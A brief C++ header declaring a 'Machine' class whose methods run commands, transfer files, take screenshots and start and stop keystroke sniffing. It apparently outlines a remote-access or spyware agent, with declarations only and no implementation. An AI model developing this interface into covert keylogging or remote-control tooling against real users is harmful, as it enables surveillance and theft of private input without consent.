#pragma once
#include <string>
#include <vector>

class Machine
{
public:
	std::string RunCommand(std::string);
	void UploadFile(std::string, std::string);
	void DownloadFile(std::string, std::string);
	void TakeScreenshot();
	void StartKeySniffing();
	void StopKeySniffing();
};

